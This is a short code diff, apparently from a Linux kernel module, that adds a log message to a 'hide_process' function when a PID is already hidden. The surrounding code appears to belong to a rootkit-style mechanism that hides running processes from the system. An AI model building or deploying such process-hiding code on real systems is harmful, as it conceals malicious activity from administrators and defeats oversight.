@@ -121,8 +121,10 @@ static int hide_process(pid_t pid)
 {
     pid_node_t *proc;
 
-    if(is_hidden_proc(pid))
+    if(is_hidden_proc(pid)){
+        pr_info("PID=%d is already hidden\n", pid);
         return -EINVAL;
+    }
 
     proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
     proc->id = pid;
